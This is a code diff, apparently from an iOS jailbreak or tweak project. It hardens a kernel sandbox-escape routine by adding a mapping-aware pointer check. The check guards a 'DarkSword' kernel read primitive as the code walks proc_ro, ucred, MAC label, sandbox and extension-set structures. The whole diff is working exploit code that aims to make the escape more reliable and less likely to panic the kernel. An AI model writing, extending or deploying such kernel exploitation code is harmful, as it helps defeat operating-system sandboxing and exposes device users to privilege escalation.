@@ -79,6 +79,24 @@ static inline bool ptr_in_kernel(uint64_t p) {
     return (p >= VM_MIN_KERNEL_ADDRESS && p <= VM_MAX_KERNEL_ADDRESS && (p & 0x7) == 0);
 }
 
+// A5.7 — mapping-aware kernel pointer check. ptr_in_kernel() only proves the
+// address is inside the kernel VA range; the DarkSword kread primitive
+// dereferences the address in kernel context, so an unmapped VA (a garbage
+// field that happens to land in range) means a data abort = kernel panic.
+// Zone objects referenced by a parent (ucred/label/sandbox/ext_set) are
+// allocated at roughly the same time and sit within a GiB of VA of each
+// other, while garbage in uninitialized struct fields essentially never
+// lands inside the window. Anchor = a known-mapped address (proc_ro, or the
+// parent object once its own read succeeded).
+#define KPTR_WINDOW 0x40000000ULL  // 1 GiB each direction
+
+static inline bool ptr_in_kernel_mapped(uint64_t p, uint64_t anchor) {
+    if (!ptr_in_kernel(p)) return false;
+    if (anchor == 0) return true;  // no anchor: fall back to the range check
+    uint64_t lo = (anchor > KPTR_WINDOW) ? (anchor - KPTR_WINDOW) : 0;
+    return (p >= lo && p <= anchor + KPTR_WINDOW);
+}
+
 #ifdef __arm64e__
 static uint64_t __attribute((naked)) __xpaci_sbx(uint64_t a) {
     asm(".long 0xDAC143E0");
@@ -217,11 +235,11 @@ int sandbox_escape(uint64_t self_proc) {
         TweakLog("[SBX]   proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx", off, raw, smr, pac);
 
         // Check if smr-decoded value looks like ucred (cr_label at +0x78 is a kernel ptr)
-        if (ptr_in_kernel(smr) && is_kaddr_valid(smr)) {
+        if (ptr_in_kernel_mapped(smr, proc_ro)) {
             uint64_t maybe_label = S(early_kread64(smr + 0x78));
-            if (ptr_in_kernel(maybe_label)) {
+            if (ptr_in_kernel_mapped(maybe_label, smr)) {
                 uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
-                if (ptr_in_kernel(maybe_sandbox)) {
+                if (ptr_in_kernel_mapped(maybe_sandbox, maybe_label)) {
                     TweakLog("[SBX] Found ucred at proc_ro+0x%x (SMR) = 0x%llx", off, smr);
                     ucred = smr;
                     break;
@@ -229,11 +247,11 @@ int sandbox_escape(uint64_t self_proc) {
             }
         }
         // Also try PAC-stripped
-        if (!ucred && ptr_in_kernel(pac) && is_kaddr_valid(pac)) {
+        if (!ucred && ptr_in_kernel_mapped(pac, proc_ro)) {
             uint64_t maybe_label = S(early_kread64(pac + 0x78));
-            if (ptr_in_kernel(maybe_label)) {
+            if (ptr_in_kernel_mapped(maybe_label, pac)) {
                 uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
-                if (ptr_in_kernel(maybe_sandbox)) {
+                if (ptr_in_kernel_mapped(maybe_sandbox, maybe_label)) {
                     TweakLog("[SBX] Found ucred at proc_ro+0x%x (PAC) = 0x%llx", off, pac);
                     ucred = pac;
                     break;
@@ -244,13 +262,13 @@ int sandbox_escape(uint64_t self_proc) {
     if (!K(ucred)) { TweakLog("[SBX] ucred not found in proc_ro"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
 
     uint64_t label = S(early_kread64(ucred + OFF_UCRED_CR_LABEL));
-    if (!K(label)) { TweakLog("[SBX] cr_label invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
+    if (!ptr_in_kernel_mapped(label, ucred)) { TweakLog("[SBX] cr_label invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
 
     uint64_t sandbox = S(early_kread64(label + OFF_LABEL_SANDBOX));
-    if (!K(sandbox)) { TweakLog("[SBX] sandbox invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
+    if (!ptr_in_kernel_mapped(sandbox, label)) { TweakLog("[SBX] sandbox invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
 
     uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
-    if (!K(ext_set)) { TweakLog("[SBX] ext_set invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
+    if (!ptr_in_kernel_mapped(ext_set, sandbox)) { TweakLog("[SBX] ext_set invalid"); return TWEAK_ERR_KERNEL_PTR_INVALID; }
 
     TweakLog("[SBX] proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx",
           proc_ro, ucred, label, sandbox, ext_set);
